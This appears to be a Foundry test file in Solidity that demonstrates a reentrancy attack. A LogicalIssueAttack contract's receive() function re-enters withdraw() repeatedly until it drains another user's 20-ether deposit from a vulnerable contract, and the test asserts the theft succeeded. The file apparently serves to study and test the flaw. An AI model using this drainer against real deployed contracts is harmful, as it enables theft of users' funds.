// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {LogicalIssue} from "../src/vectorAttack/LogicalIssue.sol";

contract LogicalIssueTest is Test {
    LogicalIssue logicalissue;
    LogicalIssueAttack logicalissueattack;

    address user = address(1);
    address userTwo = address(2);

    function setUp() external {
        logicalissue = new LogicalIssue();
        logicalissueattack = new LogicalIssueAttack(LogicalIssue(logicalissue));

        vm.deal(address(logicalissueattack), 1 ether);
        vm.deal(userTwo, 20 ether);
    }

    function test_logicalissue() external {
        vm.prank(userTwo);
        logicalissue.deposit{value: 20 ether}();

        vm.startPrank(address(logicalissueattack));
        logicalissue.deposit{value: 1 ether}();
        logicalissue.withdraw(1 ether);

        if (address(logicalissueattack).balance != 21 ether) revert();
        vm.stopPrank();
    }
}

contract LogicalIssueAttack {
    address public owner;

    LogicalIssue logicalissueattack;

    constructor(LogicalIssue _contractaddress) {
        logicalissueattack = LogicalIssue(_contractaddress);
        owner = msg.sender;
    }

    receive() external payable {
        if (address(logicalissueattack).balance > 0) {
            logicalissueattack.withdraw(1 ether);
        }
    }
}
